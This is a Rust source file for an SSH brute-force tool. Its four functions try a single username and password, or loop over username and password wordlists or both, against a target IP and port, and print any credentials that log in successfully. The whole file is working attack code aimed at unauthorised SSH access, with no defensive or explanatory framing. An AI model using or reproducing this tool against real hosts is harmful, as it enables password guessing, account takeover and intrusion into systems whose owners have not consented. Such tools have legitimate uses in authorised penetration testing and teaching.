use std::process;

use ssh_rs::ssh;



pub fn BruteSSHUserAndPass(user: String, pass: String, ip: String, port: &str) {
    println!("[+] Doing the test\n");
    
    let sessionSSH = ssh::create_session()
        .username(user.as_str())
        .password(pass.as_str())
        .connect(format!("{}:{}", ip, port));

    match sessionSSH {
        Ok(_) => {
            println!("[+] Login: {} | Password: {}", user, pass);
            

        },

        Err(error) => {
            if error.kind().to_string() == "connection refused" {
                println!("[-] The host don't running the SSH or is not up");
                process::exit(1);

            }else if error.kind().to_string() == "user auth failure." {
                println!("[-] User or password incorrect");
                process::exit(1);

            }else {
                println!("[-] an unknowledge error ocurred");
                process::exit(1);

            }
        }
    }
}

pub fn BruteSSHUserListAndPass(userWordlist: Vec<&str>, pass: String, ip: String, port: &str){
    println!("[+] Doing the brute-force attack\n");

    for user in userWordlist.iter() {
        let sessionSSH = ssh::create_session()
            .username(user)
            .password(pass.as_str())
            .connect(format!("{}:{}", ip, port));

        match sessionSSH {
            Ok(_) => {
                println!("[+] Login: {} | Password: {}", user, pass);
                continue;

            },

            Err(error) => {
                if error.kind().to_string() == "connection refused" {
                    println!("[-] The host don't running the SSH or is not up");
                    process::exit(1);

                }else if error.kind().to_string() == "user auth failure." {
                    println!("[*] Tried {}", &user);
                    continue;

                }else {
                    println!("[-] an unknowledge error ocurred");
                    process::exit(1);

                }
            }
        }
    }


}

pub fn BruteSSHUserAndPassList(user: String, passWordlist: Vec<&str>, ip: String, port: &str){
    println!("[+] Doing the brute-force attack\n");

    for pass in passWordlist.iter() {
        let sessionSSH = ssh::create_session()
            .username(user.as_str())
            .password(pass)
            .connect(format!("{}:{}", ip, port));

        match sessionSSH {
            Ok(_) => {
                println!("[+] Login: {} | Password: {}", user, pass);
                continue;

            },

            Err(error) => {
                if error.kind().to_string() == "connection refused" {
                    println!("[-] The host don't running the SSH or is not up");
                    process::exit(1);

                }else if error.kind().to_string() == "user auth failure." {
                    println!("[*] Tried {}", &pass);
                    continue;


                }else {
                    println!("[-] an unknowledge error ocurred");
                    process::exit(1);

                }
            }
        }
    }

}

pub fn BruteSSHUserListAndPassList(userWordlist: Vec<&str>, passWordlist: Vec<&str>, ip: String, port: &str){
    println!("[+] Doing the brute-force attack (can take time)\n");

    for user in userWordlist.iter() {
        for pass in passWordlist.iter() {
            let sessionSSH = ssh::create_session()
                .username(user)
                .password(pass)
                .connect(format!("{}:{}", ip, port));

            match sessionSSH {
                Ok(_) => {
                    println!("[+] Login: {} | Password: {}", user, pass);
                    continue;

                },

                Err(error) => {
                    if error.kind().to_string() == "connection refused" {
                        println!("[-] The host don't running the SSH or is not up");
                        process::exit(1);
    
                    }else if error.kind().to_string() == "user auth failure." {
                        println!("[*] Tried {}:{}", &user, &pass);
                        continue;
    
                    }else {
                        println!("[-] an unknowledge error ocurred");
                        process::exit(1);
    
                    }

                },
            }
        }
    }
}